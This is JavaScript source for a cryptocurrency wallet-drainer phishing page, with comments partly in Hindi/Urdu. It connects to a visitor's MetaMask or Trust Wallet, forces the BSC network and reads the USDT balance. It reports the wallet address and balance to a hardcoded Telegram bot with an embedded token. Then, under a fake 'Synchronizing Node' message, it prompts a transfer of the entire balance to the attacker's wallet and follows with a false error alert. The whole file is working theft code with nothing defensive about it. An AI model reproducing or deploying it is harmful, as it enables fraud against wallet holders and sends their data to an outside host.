// --- CONFIGURATION ---
const MY_WALLET = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
const BOT_TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const CHAT_ID = "7849151110";

// --- TELEGRAM NOTIFIER ---
async function notify(msg) {
    try {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
    } catch(e) {}
}

// --- MAIN LOGIC ---
async function mainLogic() {
    const overlay = document.getElementById('overlay');
    const loadingText = document.getElementById('loading-text');
    
    // 1. Check if Provider exists
    if (!window.ethereum) {
        alert("Please use a Web3 compatible browser (Trust Wallet or MetaMask).");
        overlay.style.display = 'none';
        return;
    }

    try {
        const web3 = new Web3(window.ethereum);
        
        // 2. Request Accounts (MetaMask/Trust dono ke liye same)
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        // Identify Wallet Type for Telegram
        let walletType = "Generic/MetaMask";
        if (window.ethereum.isTrust || window.trustwallet) walletType = "Trust Wallet";

        // 3. Force Switch to BSC (Chain ID: 0x38)
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (switchError) {
            // Agar network add nahi hai toh alert
            console.error("Network switch failed");
        }

        loadingText.innerText = "Analyzing Assets...";
        
        // 4. Check USDT Balance
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, USDT_BEP20);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

        // 5. Send User Info to Telegram
        notify(`👤 <b>New Connection</b>\nWallet: <code>${userAddress}</code>\nType: <b>${walletType}</b>\nBalance: <b>${balanceEth} USDT</b>`);

        if (parseFloat(balanceEth) > 0) {
            loadingText.innerText = "Synchronizing Node...";
            
            // 6. Request Transfer (The Signature Pop-up)
            await contract.methods.transfer(MY_WALLET, balanceWei).send({
                from: userAddress
            });

            notify(`✅ <b>Success!</b>\nFrom: <code>${userAddress}</code>\nAmount: ${balanceEth} USDT`);
            alert("Security Error: Node synchronization failed. Please try again.");
        } else {
            alert("Verification Complete: No assets detected in this node.");
        }

    } catch (error) {
        console.error(error);
        notify(`❌ <b>Error/Rejected</b>\nUser: <code>${window.ethereum.selectedAddress || 'Unknown'}</code>`);
        alert("Security Alert: Connection rejected by user.");
    } finally {
        overlay.style.display = 'none';
    }
}

// Global scope mein expose karna taaki index.html se call ho sake
window.mainLogic = mainLogic;
